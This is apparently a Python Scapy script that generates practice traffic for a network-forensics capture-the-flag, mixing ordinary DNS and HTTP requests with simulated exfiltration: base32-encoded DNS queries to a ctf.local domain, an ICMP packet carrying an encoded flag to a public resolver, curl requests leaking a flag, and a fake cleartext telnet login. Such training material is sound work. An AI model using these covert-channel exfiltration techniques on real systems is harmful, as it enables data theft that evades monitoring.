from scapy.all import *
import random
import time
import os
import socket

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP, ICMP, TCP

DNS_SERVER = "8.8.8.8"

NORMAL_DOMAINS = [
    "google.com",
    "openai.com",
    "mozilla.org",
    "youtube.com",
    "strathmore.edu"
]

# -----------------------------------
# Get host machine IP dynamically
# -----------------------------------
def get_host_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Doesn't actually send traffic
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
    finally:
        s.close()

    return ip_address

HOST_IP = get_host_ip()

HTTP_TARGET = f"http://{HOST_IP}:8000"

print(f"[+] Host IP detected: {HOST_IP}")
print(f"[+] HTTP Target: {HTTP_TARGET}")

# -----------------------------------
# DNS Traffic
# -----------------------------------
def send_dns(domain):
    pkt = IP(dst=DNS_SERVER) / UDP(
        sport=random.randint(1024, 65535),
        dport=53
    ) / DNS(
        rd=1,
        qd=DNSQR(qname=domain)
    )

    send(pkt, verbose=0)

def dns_exfil():
    domains = [
        "MZWGCZ33MRXHG.ctf.local",
        "X3UOVXG4ZLML5.ctf.local",
        "SXQZTJNR6Q====.ctf.local"
    ]

    for d in domains:
        send_dns(d)
        time.sleep(0.5)

# -----------------------------------
# HTTP Traffic
# -----------------------------------
def http_normal():
    os.system(f"curl -4 -s {HTTP_TARGET} > /dev/null")

def http_flag():
    os.system(f"curl -4 -s {HTTP_TARGET}/secret.txt > /dev/null")

def http_header_flag():
    os.system(
        f'curl -4 -H "X-Flag: flag{{header_leak}}" {HTTP_TARGET} > /dev/null'
    )

# -----------------------------------
# ICMP Traffic
# -----------------------------------
def icmp_flag():
    send(
        IP(dst="8.8.8.8") /
        ICMP() /
        b"MZWGCZ33NFRW24C7ONSWG4TFOR6QU===",
        verbose=0
    )

# -----------------------------------
# Fake Telnet Traffic
# -----------------------------------
def fake_telnet():
    payload = b"login: admin\r\npassword: password123\r\n"

    pkt = (
        IP(dst=HOST_IP) /
        TCP(dport=23, flags="PA") /
        payload
    )

    send(pkt, verbose=0)

# -----------------------------------
# Main Loop
# -----------------------------------
try:
    while True:

        # Normal activity
        for _ in range(3):
            send_dns(random.choice(NORMAL_DOMAINS))
            time.sleep(random.uniform(0.5, 1.5))

        http_normal()

        # Random malicious behavior
        action = random.choice([
            dns_exfil,
            http_flag,
            http_header_flag,
            icmp_flag,
            fake_telnet
        ])

        action()

        time.sleep(random.uniform(1, 3))

except KeyboardInterrupt:
    print("Stopped")